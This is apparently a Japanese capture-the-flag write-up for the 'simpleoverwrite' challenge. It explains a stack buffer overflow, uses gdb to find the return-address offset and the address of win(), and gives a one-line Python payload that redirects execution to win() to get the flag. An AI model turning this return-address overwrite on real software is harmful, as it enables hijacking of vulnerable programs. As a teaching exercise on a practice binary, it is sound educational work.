# simpleoverwrite

## 概要

バッファオーバーフローを用いて，`main()`のreturn先を`win()`の書き換える．(ROP攻撃)

## 解法

`char*10 = 10bytes`で定義されている`buf`に対して32バイトまで書き込む事ができるので，スタックに積まれているmainのリターンアドレスを書き変えます．

`gdb`でmainを逆コンパイルするとスタックの動きが見えてきて，

```asm
(gdb) disas main

Dump of assembler code for function main:
   0x00000000004011cf <+0>:     push   rbp
   0x00000000004011d0 <+1>:     mov    rbp,rsp
   0x00000000004011d3 <+4>:     sub    rsp,0x10
   0x00000000004011d7 <+8>:     mov    QWORD PTR [rbp-0xa],0x0
   0x00000000004011df <+16>:    mov    WORD PTR [rbp-0x2],0x0
```

アドレス`高` ----- > `低`で

`ret(8bytes)` | `rbp(8bytes)` | `buf(10bytes)`

の順番に積まれているようです．

`buf`から18バイト目以降にreturnアドレスが来ていることが分かるので，後はwinのアドレスを調べて

```
(gdb) info address win

Symbol "win" is at 0x401186 in a file compiled without debugging.

```

最終的なペイロードは次のとおりです．

> アドレスは8byte (64bit) であることに注意

```python
payload = b'A'*18 + (0x401186).to_bytes(8, 'little')
```

これでフラグがゲットできます！
